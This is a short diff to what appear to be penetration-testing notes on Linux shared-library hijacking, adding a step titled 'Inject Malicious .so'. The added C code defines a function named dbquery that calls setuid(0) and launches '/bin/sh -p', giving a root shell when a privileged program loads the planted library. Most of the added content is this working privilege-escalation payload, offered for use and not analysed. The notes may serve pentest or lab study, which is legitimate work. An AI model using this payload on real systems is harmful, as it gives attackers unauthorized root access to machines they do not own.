@@ -30,6 +30,17 @@ Check if the path is writable:
 
 ✅ 5. Inject Malicious .so
       If writable path exists and required symbol is known, write a custom .so with that symbol and drop it in the target path.
+-----------------------------------------------------------------------------
+                  #include<stdio.h>
+                  #include<stdlib.h>
+                  #include<unistd.h>
+                  
+                  void dbquery() {
+                      printf("Malicious library loaded\n");
+                      setuid(0);
+                      system("/bin/sh -p");
+                  } 
+-----------------------------------------------------------------------------
 
 🔁 Flowchart: Dynamic Linker’s Library Loading Order
 
